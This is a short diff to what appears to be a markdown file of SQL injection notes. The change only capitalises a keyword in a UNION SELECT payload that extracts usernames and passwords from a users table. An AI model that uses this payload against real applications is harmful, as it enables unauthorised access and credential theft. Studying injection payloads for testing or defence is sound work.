@@ -40,5 +40,5 @@
 ## Extraction
 
 ```sql
-' UNION SELECT username, password from users-- -
+' UNION SELECT username, password FROM users-- -
 ```
